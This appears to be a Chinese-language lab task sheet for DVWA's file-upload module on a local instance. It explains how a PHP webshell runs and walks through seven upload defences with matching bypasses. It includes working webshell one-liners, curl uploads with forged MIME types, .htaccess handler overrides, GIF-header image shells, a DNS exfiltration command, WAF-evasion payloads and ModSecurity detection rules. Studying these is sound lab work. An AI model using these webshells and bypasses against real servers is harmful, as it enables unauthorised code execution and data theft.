# 11/20 任务书：木马执行的底层逻辑 + 七层全解

> 这份专门回答三个问题：
> 1. 我访问那个木马时，服务器内部到底发生了什么？
> 2. 我敲的每条命令，背后是怎么被执行的？
> 3. 七层检测，每层的代码长什么样、对应的攻击命令是什么、为什么成立？

---

# 第一部分：从一个 URL 到屏幕上的 PWNED，中间发生了什么

## 你做的动作

浏览器访问：

```
http://127.0.0.1:4280/hackable/uploads/shell.php?c=whoami
```

## 服务器内部的八步

### 第 1 步：浏览器把 URL 拆成请求

浏览器先解析这个 URL：

| 部分 | 值 |
|---|---|
| 协议 | `http` |
| 主机 | `127.0.0.1` |
| 端口 | `4280` |
| 路径 | `/hackable/uploads/shell.php` |
| 查询串 | `c=whoami` |

然后组装成一段文本（这就是 HTTP 请求）：

```
GET /hackable/uploads/shell.php?c=whoami HTTP/1.1
Host: 127.0.0.1:4280
User-Agent: Mozilla/5.0 ...
Accept: text/html
```

**注意：GET 的参数在 URL 里，不在请求体里。** 这是 GET 和 POST 最本质的区别。

### 第 2 步：TCP 连接打到 4280

浏览器跟 `127.0.0.1:4280` 建立 TCP 连接，把上面那段文本发过去。

### 第 3 步：Docker 把 4280 转到容器内的 80

你 `docker compose ps` 看到的 `0.0.0.0:4280->80/tcp`，就是这一步。

**Kali 的 4280 端口收到的东西，被转发进容器的 80 端口。**

所以容器里的 Apache 完全不知道外面是 4280，它以为自己在 80 上。

### 第 4 步：Apache 决定"这个文件交给谁"

Apache 收到请求，路径是 `/hackable/uploads/shell.php`。

它先做**路径解析**：把 URL 路径映射成磁盘路径。

```
/var/www/html/ + hackable/uploads/shell.php
= /var/www/html/hackable/uploads/shell.php
```

然后做**处理器判定**——这里就是你前天改的那个配置起作用的地方：

```apache
<FilesMatch \.php$>
  SetHandler application/x-httpd-php
</FilesMatch>
```

`shell.php` 匹配 `\.php$`，所以 SetHandler 生效，这个文件被交给 **PHP 处理器**。

**如果不匹配**（比如 `shell.phtml` 在原始配置下），SetHandler 不生效，Apache 就按静态文件处理——把文件内容原样读出来发回去。**这就是"返回源码"的真正含义。**

### 第 5 步：PHP 拿到文件，处理它

Apache 通过 mod_php 把这个文件交给 PHP 解释器（你这个容器是 mod_php，不是 PHP-FPM）。

PHP 内部做四件事：

**① 读文件到内存**

**② 词法分析（lexer）** —— 把字符流切成 token

`<?php echo "PWNED:" . $_GET["c"]; ?>` 被切成：

```
T_OPEN_TAG       <?php
T_ECHO           echo
T_CONSTANT_ENCAPSED_STRING  "PWNED:"
T_CONCAT         .
T_VARIABLE       $_GET
...
```

**③ 语法分析 + 编译** —— 把 token 变成抽象语法树，再编译成 Zend 虚拟机指令（opcode）

大致是：

```
ECHO  "PWNED:"
CONCAT 上一步的输出 + $_GET["c"] 的值
ECHO 结果
```

**④ 执行 opcode**

到这一步，PHP 才开始"跑"你的代码。

### 第 6 步：`$_GET["c"]` 的值从哪来

关键一步。

PHP 启动处理这个请求时，PHP 的 SAPI（这里是 Apache 模块）会给它一堆环境信息，其中一个是 `QUERY_STRING`，值是：

```
c=whoami
```

PHP 内部有个步骤叫 **`php_register_variable`**，它做：

1. 按 `&` 切分成多个 `key=value`
2. 按 `=` 切开 key 和 value
3. 对 key 和 value 做 **URL 解码**（把 `%20` 变空格、`%3B` 变分号之类）
4. 塞进 `$_GET` 这个超全局数组

于是 `$_GET["c"]` 的值就是字符串 `whoami`。

**这一步是为什么你能在 URL 里传 payload 的全部原因。**

**注意：这是 PHP 在内存里建的一个数组，跟磁盘、跟数据库都没关系。** 你的参数从网线进来，经过解析，直接变成程序里的一个变量。

### 第 7 步：执行你的代码

`echo "PWNED:" . $_GET["c"];`

三个动作：

1. 取 `$_GET["c"]` → `"whoami"`
2. 用 `.` 拼成 `"PWNED:whoami"`
3. `echo` 把它写进 **output buffer**（输出缓冲区）

**echo 不是函数，是语言结构。** 它不返回任何值，直接把内容塞进输出缓冲区。

### 第 8 步：输出回浏览器

PHP 处理完，把 output buffer 的内容交给 Apache。

Apache 加上响应头（`HTTP/1.1 200 OK`、`Content-Type: text/html`、`Content-Length: 14` 等），通过同一条 TCP 连接发回浏览器。

浏览器渲染，你看到 `PWNED:whoami`。

## 整条链，用一句话概括

```
浏览器(URL) → TCP → 端口映射 → Apache(判定处理器) → PHP(编译执行)
  → $_GET(解析参数) → output buffer → Apache(加头) → 浏览器(渲染)
```

**八步里，攻击者能控制的只有两个地方：URL 里的参数，和传上去的文件内容。**

---

# 第二部分：你敲的每条命令，背后在干什么

## 2.1 `<?php echo ... ?>` 和 `<?php system(...) ?>` 的区别

这两个看起来差不多，底层完全不同。

### echo 版本

```php
<?php echo "PWNED:" . $_GET["c"]; ?>
```

执行过程：

1. PHP 取 `$_GET["c"]` 的值（内存操作）
2. 字符串拼接（内存操作）
3. 写进 output buffer（内存操作）

**全程在 PHP 进程内部，没有调用任何外部程序，没有碰文件系统，没有起子进程。**

这就是为什么它永远不会被杀毒软件、WAF 的"命令执行"规则拦住——**它压根没有执行任何命令。**

### system 版本

```php
<?php system($_GET["c"]); ?>
```

执行过程：

1. PHP 取 `$_GET["c"]` 的值，比如 `whoami`
2. 调用 C 库函数 `system("whoami")`
3. `system()` 内部做三件事：
   - `fork()` —— 复制出一个子进程
   - 子进程执行 `execl("/bin/sh", "sh", "-c", "whoami", NULL)`
   - 父进程 `waitpid()` 等子进程结束
4. `/bin/sh` 解析 `whoami`，发现是外部命令，去 `$PATH` 里找 `/usr/bin/whoami`
5. `whoami` 运行，往 stdout 写 `www-data`
6. 子进程的 stdout **直接继承父进程的 stdout**（也就是 PHP 的输出流）
7. 所以 `www-data` 直接出现在你的 HTTP 响应里

**看差别没有：**

| | echo | system |
|---|---|---|
| 起子进程 | 否 | 是 |
| 执行外部命令 | 否 | 是 |
| 碰文件系统 | 否 | 是（找 /bin/sh、找 whoami） |
| 输出方式 | 写 output buffer | 子进程 stdout 直连 |

**这就是为什么 echo 永远能用，system 经常被禁。**

服务器禁用的方式（`disable_functions`）：

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

禁了之后你调 `system()` 会报错：

```
Warning: system() has been disabled for security reasons
```

## 2.2 五个命令执行函数，怎么选

| 函数 | 输出去哪 | 返回值 | 适合什么 |
|---|---|---|---|
| `system()` | **直接输出**到响应 | 最后一行 + 退出码 | 一次性命令，想看输出 |
| `exec()` | **不输出**，存进数组 | 最后一行 | 需要逐行处理 |
| `shell_exec()` | **不输出**，返回字符串 | 全部输出 | 需要处理输出内容 |
| `passthru()` | **直接输出**（二进制安全） | 无 | 传二进制数据 |
| 反引号 `` `cmd` `` | 同 `shell_exec` | 全部输出 | 简写 |

**为什么 `exec()` 要配合 echo：**

```php
<?php exec($_GET["c"], $out); echo implode("\n", $out); ?>
```

`exec` 把输出存进 `$out` 数组，你不 echo 出来，就什么都看不到。

**实战里的选择：**

- 就想看一眼 → `system`
- 要处理输出（比如 grep）→ `shell_exec`
- 要二进制（比如读文件）→ `passthru`
- 系统禁了 system → 试 `shell_exec`、`passthru`、`popen`、`proc_open`、`pcntl_exec`

**一个函数被禁，其他不一定被禁。** 服务端管理员经常漏。

## 2.3 无回显怎么办

有些环境 `disable_functions` 禁了所有命令执行，或者 stdout 不回传。

**出路一：文件操作**

```php
<?php file_put_contents("/var/www/html/x.txt", shell_exec("id")); ?>
```

先写文件，再访问那个文件读内容。

**出路二：DNS 外带**

```bash
nslookup $(whoami).你的域名
```

命令的输出（`www-data`）变成 DNS 查询的一部分，你在 DNS 服务器日志里看到。

**出路三：时间盲**

```php
<?php if(shell_exec("id | grep www-data")) sleep(5); ?>
```

有 / 无 5 秒延迟，判断条件真假。

## 2.4 `$_GET` 和 `$_POST` 和 `$_REQUEST` 的区别

| 超全局 | 内容 | 从哪来 |
|---|---|---|
| `$_GET` | URL 查询串 | `?a=1&b=2` |
| `$_POST` | 请求体（表单） | `Content-Type: application/x-www-form-urlencoded` |
| `$_REQUEST` | 两者 + cookie | 全都要 |
| `$_FILES` | 上传的文件 | `multipart/form-data` |

**`$_REQUEST` 最危险**，因为它把 GET、POST、COOKIE 全合在一起，攻击者有三个入口。

---

# 第三部分：七层，逐层的代码 / 命令 / 原理

> 每层给三样：**检测代码长什么样、对应的攻击命令、为什么能过**。

## 第 1 层：前端 JS 校验

### 检测代码（浏览器里的 JS）

```javascript
document.forms[0].onsubmit = function() {
    var f = document.getElementById("file").value;
    if (!/\.(jpg|jpeg|png)$/i.test(f)) {
        alert("只允许图片");
        return false;   // 阻止提交
    }
};
```

或者 HTML 属性：

```html
<input type="file" accept="image/*">
```

### 攻击命令

**最简单：Burp 抓包，改完放行。**

或者直接构造请求：

```bash
curl -F "uploaded=@/tmp/shell.php;type=image/jpeg" http://目标/upload.php
```

### 为什么能过

**因为 JS 跑在你的浏览器里，不在服务器上。**

`accept` 属性只是文件选择框的过滤器，用户选"所有文件"就能绕过。`onsubmit` 只是拦提交，Burp 拦截后改完放行，JS 根本没机会执行。

**一句话：前端校验等于没有校验，它只防君子。**

### 在 DVWA 哪一档

DVWA 没有这一层。这是真实网站才有的。

---

## 第 2 层：后缀黑名单

### 检测代码

```php
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$blacklist = ["php", "php3", "php4", "asp", "aspx", "jsp", "exe"];
if (in_array($ext, $blacklist)) {
    die("不允许这个类型");
}
```

### 你在这台上验到的

`php` 被拦，`phtml` 通过。**说明这台的列表里只写了几种，没写全。**

### 攻击命令

**换后缀：**

```bash
cp shell.php shell.phtml
curl -F "uploaded=@/tmp/shell.phtml;type=image/jpeg" http://127.0.0.1:4280/vulnerabilities/upload/
```

**枚举脚本（你前天跑的那个）：**

```bash
for ext in phtml phar pht php4 php5 PHP; do
  cp shell.php shell.$ext
  # 上传 + 验证
done
```

### 为什么能过

**黑名单永远列不全。** 你不知道服务器认哪些后缀，它也不知道。

PHP 历史上有 `.php .php3 .php4 .php5 .phtml .pht .phar .phps` 一堆，Apache 的 `AddHandler` 还可能认 `.jpg`。

**防御的正确做法是白名单，不是黑名单。**

### 在 DVWA 哪一档

Medium。

---

## 第 3 层：后缀白名单

### 检测代码

```php
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, ["jpg", "jpeg", "png", "gif"])) {
    die("只允许图片");
}
```

### 攻击命令

**这一层不能靠改后缀了**，要改"服务器怎么解释后缀"。

**方案 A：`.htaccess`**（Apache 专用）

上传一个文件名就叫 `.htaccess` 的文件：

```apache
AddType application/x-httpd-php .jpg
```

然后再传 `shell.jpg`（内容是 php），它就会执行。

**注意：** `.htaccess` 没有后缀，`pathinfo` 取出来是空字符串，很多白名单会放行（因为不在禁止列表里，或者判断逻辑漏掉）。

**方案 B：多后缀**（只对 `AddHandler` 有效）

```
shell.php.jpg
```

`AddHandler` 按点切分，看到 `.php` 就交给 PHP。白名单看最后一段 `.jpg`，放行。

**你在这台验过了：`AddHandler` 没绑 PHP，所以这招不成立。**

**方案 C：利用服务器解析漏洞**

```
Nginx:  /uploads/shell.jpg/x.php
IIS6:   shell.asp;.jpg
```

### 为什么能过

**因为你改的不是文件名，是"名字到处理器"的映射规则。**

白名单管的是"叫什么"，`.htaccess` 管的是"怎么解释"。**两层不同的东西。**

### 在 DVWA 哪一档

High（用白名单 + `getimagesize`，所以还要配合 magic bytes）。

---

## 第 4 层：MIME 类型校验

### 检测代码

```php
$type = $_FILES["uploaded"]["type"];
if ($type != "image/jpeg" && $type != "image/png") {
    die("Your image was not uploaded. We can only accept JPEG or PNG images.");
}
```

### 攻击命令

```bash
curl -F "uploaded=@/tmp/shell.phtml;type=image/jpeg" http://目标/upload.php
```

`;type=image/jpeg` 就是在伪造这个字段。

### 为什么能过

**`$_FILES["uploaded"]["type"]` 这个值，是浏览器写在请求里的。**

服务器读到的不是"文件的真实类型"，是"浏览器说它是什么类型"。**而浏览器说的话，攻击者可以随便改。**

**关键对比（你昨天亲手验的）：**

| 方式 | Content-Type | 结果 |
|---|---|---|
| 浏览器传 `.phtml` | 浏览器自动猜（不是 jpeg） | 被拦 |
| curl + `type=image/jpeg` | 手动伪造 | 通过 |

### 在 DVWA 哪一档

Medium。

---

## 第 5 层：文件头（magic bytes）

### 检测代码

```php
$size = getimagesize($_FILES["uploaded"]["tmp_name"]);
if ($size === false) {
    die("不是有效图片");
}
```

或者更严谨：

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$realType = finfo_file($finfo, $_FILES["uploaded"]["tmp_name"]);
if (!in_array($realType, ["image/jpeg", "image/png"])) {
    die("不是有效图片");
}
```

### 这些函数怎么判断

`getimagesize` 读文件**前 12 个字节**，按格式的特征判定：

| 格式 | 开头字节 | 变成字符是什么 |
|---|---|---|
| GIF | `47 49 46 38` | `GIF8` |
| JPEG | `FF D8 FF` | （不可打印） |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `PNG` + 换行 |

**它只读开头，不读整体。**

### 攻击命令

**方案 A：加 GIF 头**

```bash
printf 'GIF89a' > /tmp/shell.gif
printf '<?php system($_GET["c"]); ?>' >> /tmp/shell.gif
```

或者一行：

```bash
echo -n 'GIF89a<?php echo "PWNED:" . $_GET["c"]; ?>' > /tmp/shell.gif
```

上传 `shell.gif`，配合 `.htaccess` 或解析漏洞让它执行。

**方案 B：图片马**

```bash
cat real.jpg shell.php > /tmp/shell.jpg
```

把一个真图片和 php 代码拼起来。`getimagesize` 看到真 JPEG 头，放行。

**执行时 PHP 会把前面那堆二进制当文本输出，最后的 php 代码照常执行。**

### 为什么能过

**因为它检查的是"开头像不像图片"，不是"整个文件是不是图片"。**

你只要让开头像，后面放什么都行。

### 在 DVWA 哪一档

High。

---

## 第 6 层：二次渲染

### 检测代码

```php
$img = imagecreatefromstring(file_get_contents($_FILES["uploaded"]["tmp_name"]));
if ($img === false) {
    die("不是有效图片");
}
// 重新编码，覆盖原文件
imagejpeg($img, $dest, 90);
```

### 这一层做了什么

1. 用 GD 库把文件**解析成像素矩阵**（宽 × 高 × 颜色）
2. 丢弃所有非像素数据（注释、EXIF、文件尾部追加的内容）
3. 用 `imagejpeg` **重新编码**成一张全新的 JPEG

**结果：你藏在文件里的任何代码，全部消失。**

### 为什么它是最强防护

前面五层检查的是"文件的某些特征"——后缀、MIME、文件头。**这些特征都可以伪造。**

这一层不检查特征，它**直接把文件重建成"它理解的样子"**。

你塞的东西它理解不了，直接扔掉。

### 绕过思路

**核心问题：重新编码后，还有哪些数据会保留？**

| 格式 | 会保留的区域 | 思路 |
|---|---|---|
| GIF | 调色板、注释扩展块 | 把 payload 塞进注释块 |
| PNG | `tEXt` / `iTXt` 块 | 塞进文本元数据 |
| JPEG | EXIF / COM 注释段 | 塞进注释 |
| 通用 | 尺寸超大的图 | 超过处理阈值的可能被原样保存 |

**但注意：即使 payload 保住了，"执行"还是另一个问题。** 你得配合文件包含（LFI）去包含它，因为 `.jpg` 本身不会被执行。

### 在 DVWA 哪一档

Impossible。这一档基本无解，设计目标就是"防死"。

---

## 第 7 层：WAF / 内容检测

### 检测代码（ModSecurity 规则的样子）

```apache
SecRule FILES_TMPNAMES "@contains <?php" \
    "id:1001,deny,status:403,msg:'PHP webshell detected'"

SecRule FILES_TMPNAMES "@rx (system|exec|shell_exec|passthru)\s*\(" \
    "id:1002,deny,status:403"
```

它读**文件内容**，匹配危险字符串。

### 攻击命令

| 绕过思路 | payload | 原理 |
|---|---|---|
| 短标签 | `<?= system($_GET[1]) ?>` | 规则只查 `<?php` |
| 大小写 | `<?PHP SYSTEM($_GET[1]) ?>` | 正则没加 `i` 标志 |
| 函数变量 | `$f="sys"."tem"; $f($_GET[1]);` | 字符串被拆开，不匹配 `system(` |
| 变量函数 | `$a="system"; $a($_GET[1]);` | 完全不含字面量 `system(` |
| 编码 | `eval(base64_decode("c3lzdGVt..."));` | 危险内容不可见 |
| 拼接关键字 | `<?ph"."p system(...)` | 正则匹配不到完整标签 |
| 分块传输 | `Transfer-Encoding: chunked` | WAF 不重组分块时失效 |

### 为什么能过

**WAF 是字符串匹配，不是语义理解。**

它不认识"这段代码要干什么"，只认识"这段字符串像不像已知的攻击"。

所以任何"看起来不像但功能一样"的写法，都能过。

### 在 DVWA 哪一档

DVWA 没有。**你有现成的：`8088` 端口那台 ModSecurity。**

---

# 第四部分：完整过法（对着你现在这台）

## Low

不用绕，直接传 `shell.php`。

## Medium（你已经过了）

**检测：** 后缀黑名单 + MIME + 大小限制。

**过法：**

```bash
SID=$(grep PHPSESSID /tmp/c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=medium"
cp /tmp/shell.php /tmp/shell.phtml
TOK=$(curl -s -H "Cookie: $CK" http://127.0.0.1:4280/vulnerabilities/upload/ | grep -oP "name='user_token' value='\K[^']+")
curl -s -H "Cookie: $CK" -F "uploaded=@/tmp/shell.phtml;type=image/jpeg" -F "user_token=$TOK" -F "Upload=Upload" http://127.0.0.1:4280/vulnerabilities/upload/
```

**关键两点：** 后缀换成不在黑名单里的 `.phtml`，MIME 伪造 `image/jpeg`。

## High

**检测：** 后缀白名单 + `getimagesize`。

**过法：** 图片马。

```bash
# 造一个 GIF 头的木马
echo -n 'GIF89a<?php echo "PWNED:" . $_GET["c"]; ?>' > /tmp/shell.gif

# 或者用真图片拼接
cat /tmp/real.jpg /tmp/shell.php > /tmp/shell.jpg
```

上传后验证 payload 还在不在：

```bash
xxd /tmp/shell.gif | head -5
```

**但 High 后面还有执行问题：** `.gif` 不会被执行，要看服务器配置，或者配合文件包含。

## Impossible

二次渲染。**先别花时间，这一档是给你看"防死"长什么样的。**

---

# 第五部分：抄写安排（按 5 小时）

| 时段 | 内容 | 时长 |
|---|---|---|
| 上午 | 第一部分 8 步链路 | 70 分钟 |
| 上午 | 第六步 `$_GET` 怎么解析 | 30 分钟 |
| 午饭 | 第二部分 2.1 echo vs system | 50 分钟 |
| 下午 | 第二部分 2.2 五个函数的区别 | 40 分钟 |
| 下午 | 第三部分 第 1-3 层 | 60 分钟 |
| 下午 | 第三部分 第 4-5 层 | 50 分钟 |
| 下班前 | 第三部分 第 6-7 层 | 40 分钟 |

**忙的话优先抄：8 步链路 + echo vs system + 第 4 层和第 5 层。** 这三块是核心。

---

# 第六部分：晚上验证题

## 题一：证明 echo 和 system 的差别

传两个木马：

```bash
echo -n '<?php echo "ECHO:" . $_GET["c"]; ?>' > /tmp/t_echo.php
echo -n '<?php system($_GET["c"]); ?>' > /tmp/t_sys.php
```

两个都传上去，然后：

```bash
curl -s "http://127.0.0.1:4280/hackable/uploads/t_echo.php?c=whoami"
curl -s "http://127.0.0.1:4280/hackable/uploads/t_sys.php?c=whoami"
```

**第一个显示 `ECHO:whoami`，第二个显示 `www-data`。**

**这一题的意义：** 你亲眼看到"传参"和"执行命令"是两件事。

## 题二：证明 exec 不输出

```bash
echo -n '<?php exec($_GET["c"], $o); ?>' > /tmp/t_exec.php
echo -n '<?php exec($_GET["c"], $o); echo implode("\n", $o); ?>' > /tmp/t_exec2.php
```

两个都传，都访问 `?c=whoami`。

**第一个空白，第二个显示 `www-data`。**

**这一题的意义：** 理解"函数返回值"和"函数输出"的区别。

## 题三：看 High 的源码

DVWA Security 切 **High**，进 File Upload，点右下角 **View Source**。

**把那个 `if` 和 `getimagesize` 那段抄下来发我。**

看完你就知道 High 到底检查了什么——比我讲十遍都准。

---

# 最后一句

**这七层，没有一层是"检查文件本身是不是安全的"。**

它们检查的都是**特征**：后缀、MIME、文件头、字符串。

而特征是攻击者能伪造的，所以才有绕过。

**唯一的例外是二次渲染——它不检查特征，它重建文件。所以它防得住。**

这个区别，是整份资料最值钱的一句话。
